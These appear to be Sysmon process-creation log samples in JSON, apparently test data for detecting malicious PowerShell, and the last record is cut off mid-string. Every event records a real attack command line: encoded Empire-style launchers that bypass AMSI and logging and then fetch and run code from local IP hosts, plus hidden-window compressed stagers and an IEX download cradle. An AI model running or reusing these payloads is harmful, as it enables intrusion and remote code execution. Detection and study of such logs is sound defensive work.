{
  "Event": {
    "EventData": {
      "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  -noP -sta -w 1 -enc JABHAHIATwB1AHAAUABvAEwASQBjAFkAUwBFAFQAdABJAE4AZwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAEUAbQBiAEwAeQAuAEcAZQBUAFQAWQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAdABWAGEAbABVAGUAKAAkAE4AVQBsAGwAKQA7ACQARwBSAE8AVQBwAFAATwBsAEkAYwBZAFMARQBUAFQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwByAE8AVQBQAFAAbwBsAGkAYwB5AFMARQB0AFQAaQBuAEcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMAZQBtAGIATABZAC4ARwBFAFQAVABZAFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgBVAGwAbAAsACQAdAByAFUAZQApAH0AOwBbAFMAeQBzAFQARQBNAC4ATgBFAHQALgBTAGUAcgBWAEkAYwBlAFAATwBpAE4AdABNAGEAbgBBAGcARQByAF0AOgA6AEUAeABQAGUAYwB0ADEAMAAwAEMATwBOAFQAaQBuAHUARQA9ADAAOwAkAHcAYwA9AE4ARQB3AC0ATwBCAGoARQBDAHQAIABTAHkAcwBUAGUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAGMALgBIAGUAYQBkAGUAUgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIATwBYAHkAPQBbAFMAeQBTAFQARQBtAC4ATgBlAFQALgBXAEUAYgBSAGUAUQB1AGUAUwBUAF0AOgA6AEQAZQBGAGEAdQBMAHQAVwBlAEIAUAByAG8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAHIARQBEAEUAbgBUAEkAYQBMAHMAIAA9ACAAWwBTAHkAUwBUAGUAbQAuAE4AZQBUAC4AQwBSAGUARABlAE4AVABJAGEATABDAGEAQwBoAEUAXQA6ADoARABlAEYAQQB1AEwAdABOAEUAVABXAG8AcgBLAEMAcgBFAEQARQBOAHQASQBBAEwAcwA7ACQASwA9AFsAUwBZAFMAVABFAG0ALgBUAGUAeABUAC4ARQBOAGMATwBEAGkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAWQB0AEUAUwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAVwBDAC4ASABFAGEARABlAFIAUwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AaQBnAGsAawBJAEkAUgArADEANgAxAGQAbABxAHMAbgA0ADcAcgBtAHgALwAyAEYAUQBXADAAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAA2ADYANgAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABkAEEAVABhAD0AJABXAEMALgBEAE8AVwBOAGwAbwBBAGQARABhAFQAYQAoACQAcwBFAHIAKwAkAFQAKQA7ACQAaQB2AD0AJABkAEEAVABhAFsAMAAuAC4AMwBdADsAJABkAEEAdABBAD0AJABkAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4AbABlAE4ARwB0AGgAXQA7AC0AagBPAEkAbgBbAEMAaABBAHIAWwBdAF0AKAAmACAAJABSACAAJABEAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\Desktop\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-D0E8-59DC-0000-0020C88E0100",
      "LogonId": "0x00018ec8",
      "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"-file\" \"C:\\Users\\Gen Eric\\Desktop\\empire-launcher.ps1\"",
      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ParentProcessGuid": "49F1AF32-D3B8-59DC-0000-0010C5DC0800",
      "ParentProcessId": "2472",
      "ProcessGuid": "49F1AF32-D3BB-59DC-0000-0010BE140900",
      "ProcessId": "948",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "55267",
      "Execution": {
        "ProcessID": "1376",
        "ThreadID": "1936"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "powershell  -noP -sta -w 1 -enc  JABHAHIAbwBVAHAAUABPAEwAaQBDAFkAUwBFAHQAVABJAE4ARwBTACAAPQAgAFsAUgBFAGYAXQAuAEEAUwBTAGUAbQBiAEwAWQAuAEcAZQBUAFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAEEAbABVAEUAKAAkAG4AVQBsAGwAKQA7ACQARwByAG8AdQBQAFAAbwBMAEkAYwBZAFMAZQBUAHQASQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwByAG8AdQBQAFAAbwBMAEkAYwB5AFMARQBUAFQASQBOAEcAcwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAEUAZgBdAC4AQQBTAHMAZQBtAGIATAB5AC4ARwBlAHQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAFUARQAoACQAbgB1AGwATAAsACQAVAByAFUARQApAH0AOwBbAFMAWQBzAHQARQBtAC4ATgBlAFQALgBTAEUAcgB2AEkAQwBFAFAATwBJAE4AVABNAGEATgBBAEcARQBSAF0AOgA6AEUAWABQAEUAYwBUADEAMAAwAEMATwBuAHQAaQBOAHUARQA9ADAAOwAkAHcAQwA9AE4AZQBXAC0ATwBCAGoARQBDAHQAIABTAHkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBMAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABXAEMALgBIAGUAYQBEAEUAUgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAHIATwBYAHkAPQBbAFMAWQBTAHQARQBNAC4ATgBFAHQALgBXAGUAYgBSAEUAcQB1AGUAcwB0AF0AOgA6AEQARQBGAGEAVQBsAHQAVwBlAGIAUABSAG8AeAB5ADsAJAB3AEMALgBQAFIAbwBYAHkALgBDAHIARQBEAGUAbgB0AEkAYQBsAHMAIAA9ACAAWwBTAFkAUwB0AGUAbQAuAE4ARQBUAC4AQwBSAGUAZABlAG4AdABpAEEATABDAEEAYwBIAEUAXQA6ADoARABlAEYAYQBVAGwAdABOAGUAVABXAE8AcgBrAEMAUgBFAGQAZQBOAFQAaQBhAGwAUwA7ACQASwA9AFsAUwBZAFMAVABlAG0ALgBUAEUAWABUAC4ARQBuAGMAbwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQB0AGUAcwAoACcAOAAwADcAZgBkAGUAMAA1ADQANQAxAGQAZABjADgANQAzADgAYQBkAGUAZgBjADIAZABiADAAMgAyADYAYgAyACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAVwBDAC4ASABFAGEARABlAFIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ANABSAHYAUQA0ADYARABTAGgAVwBJADcAeAA5ADUANAA5AFUAZQBRAHQARQB4AHUAMgB2AGcAPQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAA2ADYANgAnADsAJAB0AD0AJwAvAG4AZQB3AHMALgBwAGgAcAAnADsAJABkAEEAVABBAD0AJABXAEMALgBEAG8AdwBuAEwATwBBAGQARABBAHQAYQAoACQAcwBlAHIAKwAkAHQAKQA7ACQAaQB2AD0AJABEAGEAdABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABBAD0AJABEAGEAVABBAFsANAAuAC4AJABEAGEAVABBAC4ATABlAG4ARwB0AGgAXQA7AC0ASgBvAGkAbgBbAEMAaABBAFIAWwBdAF0AKAAmACAAJABSACAAJABEAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "High",
      "LogonGuid": "49F1AF32-D0E8-59DC-0000-00208C8E0100",
      "LogonId": "0x00018e8c",
      "ParentCommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /C \"C:\\Users\\GENERI~1\\AppData\\Local\\Temp\\debug.bat\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "49F1AF32-D424-59DC-0000-0010CA7C0B00",
      "ParentProcessId": "2316",
      "ProcessGuid": "49F1AF32-D424-59DC-0000-0010AB840B00",
      "ProcessId": "1552",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "62979",
      "Execution": {
        "ProcessID": "1376",
        "ThreadID": "1936"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  -nop -w hidden -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGzfeloCA7VWa2+bSBT9nEj9D6iyBEjExonTNJEqLdgmJjGpHeJ3rdUEBjz2mCHD4Nju9r/vxYY81GS3XWmRLeZx750755y5Q5BGniAsku4dZyV9/3B40EEcLSWlRF13lA6oJpWSVpOoBwcwV1qfnte3sfRFUiZGHDfYEpFoenFRTznHkdj3y5dYGEmCl/eU4ERRpb+kwQxzfPT1fo49IX2XSn+WLym7RzQ329SRN8PSkRH52VybeSjLqezGlAhF/vZNVidH1Wm5+ZAimiiyu0kEXpZ9SmVV+qFmC95tYqzIDvE4S1ggygMSnRyXe1GCAnwD0VbYwWLG/ERWYR/w41ikPJLyHWUh9gaKDM0OZ57h+xwnYF+2oxVbYKUUpRTg+EOZ5OvfppEgSwzzAnMWu5iviIeTcgtFPsW3OJgqN/ix2PavOikvncCqI7iqAR9vJuowP6V47yurP6dasKjCUzAJAPz4cPjhMCio3y54cOm/JB9aB5NdG0OWSoclZGf5RdI1yYHVkGB8A93SHU+xOpUmGf6T6RTw/DQfbug5196PUS0cwDzsmJ/rMDbpM+JPwSenpzRb9VY1vXnrZpPva62BAxLhxiZCS+IVclLewh0HFO/2Wy7MbiA1Rc4nsN/AFIdIZDhq0uRnt+aSiCdfMyXUx9zwgLsEsgJa1dfJ7KlRZDty8BLQ2vdlYCEAEePCOhfuplg964ORXKcoSTSpk8Ip8jTJxYhiX5OMKCH5lJEKtmvKz+k6KRXEQ4kowk3VV2Dmi9ZZlAieesAiAHDnxtgjiGZ4aFKL+NjcuCQsFpffRKOOKCVRCJFWwAaMZCi4ItMGhzyfdKCWXSzsZUzxEux259qiKIRTnJ+EnaBQiH35zVQLse+VnSFTQPIiUaDbpUxoUp9wATUiQ3mnrP+eyIsS8ZxSneOcIqU4RRNzIzLllwSfs04m1hyrHTJcACoWZ0sTJfhTzRUcMFM+Vr6SugHPyI6o45kLUjUeSdV24N8jJzZrnPnXV/NWhTfWs8CwE9tpdRrdVqu2unL7NeE2bXHdsYXTHM7nrtG67Y3E2DZad0RfjGrb+Ips3bbhj9aVT1tz+6ib6+089INRIwjCs8C9rZ5apD2od039GLUbzbQ9MB9NvZY0yWOrS3rdxZUl7kd9inpBJRxWzxFZt/m8X2XO1jaMy9mJt70K+pczx9+MWpXzQW1hNA2jHjX7lsmuRyY3OpU+CmP2eB2eGsuwbpiWR/C427PMbtcyjd7l/KFxXgnBd4hm5qB/TMbx8HYGfQtScCp6zfbxmn1uD0h/lcUyH0xrPERGe7yxKpXqKDlGC5MZJoBojR8gp1FsdSj43/WOmdGnN8+23Vbj2htXzxLny8eMWaC2xMftaEhesPVeWXYQT2aIAotQbYtDZTFu5cWzw0jmoSi7+3OBeYQpXDxwNRVaNChlXlbB8zIL98e+qk/hXPWgeXL8ZkuVngzV58peDF1cjCFPkPdOduU2jkIx0/T1ia5DidbXNR22+uubq7N4o+xjaVmNzwF6ik938dVM8KWHs7Nq0mRO+/+FLz9rM3j5/w7f89g/zP4SpLpWbP6nidcDvwXwb29/gIgASxfqBcX7q+w9FHK9vLj+nygCRQT5k32HfU3F0Q18GvwNaNpG4fYJAAA=''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\"",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=5330FEDAD485E0E4C23B2ABE1075A1F984FDE9FC,MD5=852D67A27E454BD389FA7F02A8CBE23F,SHA256=A8FDBA9DF15E41B6F5C69C79F66A26A9D48E174F9E7018A371600B866867DAB8,IMPHASH=F2C0E8A5BD10DBC167455484050CD683",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-DB3E-5A72-0000-00204F830100",
      "LogonId": "0x0001834f",
      "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c $B=new-object net.webclient;$B.proxy=[Net.WebRequest]::GetSystemWebProxy();$B.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $B.downloadstring('http://192.168.57.2:8080/TGnALEigHGs8');",
      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ParentProcessGuid": "49F1AF32-DF73-5A7A-0000-001096157301",
      "ParentProcessId": "2020",
      "ProcessGuid": "49F1AF32-DF74-5A7A-0000-001025697301",
      "ProcessId": "2464",
      "Product": "Microsoft� Windows� Operating System",
      "TerminalSessionId": "1",
      "User": "GenEric-PC\\Gen Eric",
      "UtcTime": "4242-04-24 13:37:42.422"
    },
    "System": {
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "Computer": "BLAHBLAH",
      "Correlation": {},
      "EventID": "1",
      "EventRecordID": "5075978",
      "Execution": {
        "ProcessID": "1312",
        "ThreadID": "1884"
      },
      "Keywords": "0x8000000000000000",
      "Level": "4",
      "Opcode": "0",
      "Provider": {
        "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
        "Name": "Microsoft-Windows-Sysmon"
      },
      "Security": {
        "UserID": "S-1-5-18"
      },
      "Task": "1",
      "TimeCreated": {
        "SystemTime": "4242-04-24 13:37:42.422"
      },
      "Version": "5"
    }
  }
}
{
  "Event": {
    "EventData": {
      "CommandLine": "\"C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAGzfeloCA7VWa2+bSBT9nEj9D6iyBEjExonTNJEqLdgmJjGpHeJ3rdUEBjz2mCHD4Nju9r/vxYY81GS3XWmRLeZx750755y5Q5BGniAsku4dZyV9/3B40EEcLSWlRF13lA6oJpWSVpOoBwcwV1qfnte3sfRFUiZGHDfYEpFoenFRTznHkdj3y5dYGEmCl/eU4ERRpb+kwQxzfPT1fo49IX2XSn+WLym7RzQ329SRN8PSkRH52VybeSjLqezGlAhF/vZNVidH1Wm5+ZAimiiyu0kEXpZ9SmVV+qFmC95tYqzIDvE4S1ggygMSnRyXe1GCAnwD0VbYwWLG/ERWYR/w41ikPJLyHWUh9gaKDM0OZ57h+xwnYF+2oxVbYKUUpRTg+EOZ5OvfppEgSwzzAnMWu5iviIeTcgtFPsW3OJgqN/ix2PavOikvncCqI7iqAR9vJuowP6V47yurP6dasKjCUzAJAPz4cPjhMCio3y54cOm/JB9aB5NdG0OWSoclZGf5RdI1yYHVkGB8A93SHU+xOpUmGf6T6RTw/DQfbug5196PUS0cwDzsmJ/rMDbpM+JPwSenpzRb9VY1vXnrZpPva62BAxLhxiZCS+IVclLewh0HFO/2Wy7MbiA1Rc4nsN/AFIdIZDhq0uRnt+aSiCdfMyXUx9zwgLsEsgJa1dfJ7KlRZDty8BLQ2vdlYCEAEePCOhfuplg964ORXKcoSTSpk8Ip8jTJxYhiX5OMKCH5lJEKtmvKz+k6KRXEQ4kowk3VV2Dmi9ZZlAieesAiAHDnxtgjiGZ4aFKL+NjcuCQsFpffRKOOKCVRCJFWwAaMZCi4ItMGhzyfdKCWXSzsZUzxEux259qiKIRTnJ+EnaBQiH35zVQLse+VnSFTQPIiUaDbpUxoUp9wATUiQ3mnrP+eyIsS8ZxSneOcIqU4RRNzIzLllwSfs04m1hyrHTJcACoWZ0sTJfhTzRUcMFM+Vr6SugHPyI6o45kLUjUeSdV24N8jJzZrnPnXV/NWhTfWs8CwE9tpdRrdVqu2unL7NeE2bXHdsYXTHM7nrtG67Y3E2DZad0RfjGrb+Ips3bbhj9aVT1tz+6ib6+089INRIwjCs8C9rZ5apD2od039GLUbzbQ9MB9NvZY0yWOrS3rdxZUl7kd9inpBJRxWzxFZt/m8X2XO1jaMy9mJt70K+pczx9+MWpXzQW1hNA2jHjX7lsmuRyY3OpU+CmP2eB2eGsuwbpiWR/C427PMbtcyjd7l/KFxXgnBd4hm5qB/TMbx8HYGfQtScCp6zfbxmn1uD0h/lcUyH0xrPERGe7yxKpXqKDlGC5MZJoBojR8gp1FsdSj43/WOmdGnN8+23Vbj2htXzxLny8eMWaC2xMftaEhesPVeWXYQT2aIAotQbYtDZTFu5cWzw0jmoSi7+3OBeYQpXDxwNRVaNChlXlbB8zIL98e+qk/hXPWgeXL8ZkuVngzV58peDF1cjCFPkPdOduU2jkIx0/T1ia5DidbXNR22+uubq7N4o+xjaVmNzwF6ik938dVM8KWHs7Nq0mRO+/+FLz9rM3j5/w7f89g/zP4SpLpWbP6nidcDvwXwb29/gIgASxfqBcX7q+w9FHK9vLj+nygCRQT5k32HfU3F0Q18GvwNaNpG4fYJAAA='));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();",
      "Company": "Microsoft Corporation",
      "CurrentDirectory": "C:\\Users\\Gen Eric\\",
      "Description": "Windows PowerShell",
      "FileVersion": "6.1.7600.16385 (win7_rtm.090713-1255)",
      "Hashes": "SHA1=04C5D2B4DA9A0F3FA8A45702D4256CEE42D8C48D,MD5=92F44E405DB16AC55D97E3BFE3B132FA,SHA256=6C05E11399B7E3C8ED31BAE72014CF249C144A8F4A2C54A758EB2E6FAD47AEC7,IMPHASH=96BA691B035D05F44E35AB23F6BA946C",
      "Image": "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
      "IntegrityLevel": "Medium",
      "LogonGuid": "49F1AF32-DB3E-5A72-0000-00204F830100",
      "LogonId": "0x0001834f",
      "ParentCommandLine": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"  -nop -w hidden -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGzfeloCA7VWa2+bSBT9nEj9D6iyBEjExonTNJEqLdgmJjGpHeJ3rdUEBjz2mCHD4Nju9r/vxYY81GS3XWmRLeZx750755y5Q5BGniAsku4dZyV9/3B40EEcLSWlRF13lA6oJpWSVpOoBwcwV1qfnte3sfRFUiZGHDfYEpFoenFRTznHkdj3y5dYGEmCl/eU4ERRpb+kwQxzfPT1fo49IX2XSn+WLym7RzQ329SRN8PSkRH52VybeSjLqezGlAhF/vZNVidH1Wm5+ZAimiiyu0kEXpZ9SmVV+qFmC95tYqzIDvE4S1ggygMSnRyXe1GCAnwD0VbYwWLG/ERWYR/w41ikPJLyHWUh9gaKDM0OZ57h+xwnYF+2oxVbYKUUpRTg+EOZ5OvfppEgSwzzAnMWu5iviIeTcgtFPsW3OJgqN/ix2PavOikvncCqI7iqAR9vJuowP6V47yurP6dasKjCUzAJAPz4cPjhMCio3y54cOm/JB9aB5NdG0OWSoclZGf5RdI1yYHVkGB8A93SHU+xOpUmGf6T6RTw/DQfbug5196PUS0cwDzsmJ/rMDbpM+JPwSenpzRb9VY1vXnrZpPva62BAxLhxiZCS+IVclLewh0HFO/2Wy7MbiA1Rc4nsN/AFIdIZDhq0uRnt+aSiCdfMyXUx9zwgLsEsgJa1dfJ7KlRZDty8BLQ2vdlYCEAEePCOhfuplg964ORXKcoSTSpk8Ip8jTJxYhiX5OMKCH5lJEKtmvKz+k6KRXEQ4kowk3VV2Dmi9ZZlAieesAiAHDnxtgjiGZ4aFKL+NjcuCQsFpffRKOOKCVRCJFWwAaMZCi4ItMGhzyfdKCWXSzsZUzxEux259qiKIRTnJ+EnaBQiH35zVQLse+VnSFTQPIiUaDbpUxoUp9wATUiQ3mnrP+eyIsS8ZxSneOcIqU4RRNzIzLllwSfs04m1hyrHTJcACoWZ0sTJfhTzRUcMFM+Vr6SugHPyI6o45kLUjUeSdV24N8jJzZrnPnXV/NWhTfWs8CwE9tpdRrdVqu2unL7NeE2bXHdsYXTHM7nrtG67Y3E2DZad0RfjGrb+Ips3bbhj9aVT1tz+6ib6+089INRIwjCs8C9rZ5apD2od039GLUbzbQ9MB9NvZY0yWOrS3rdxZUl7kd9inpB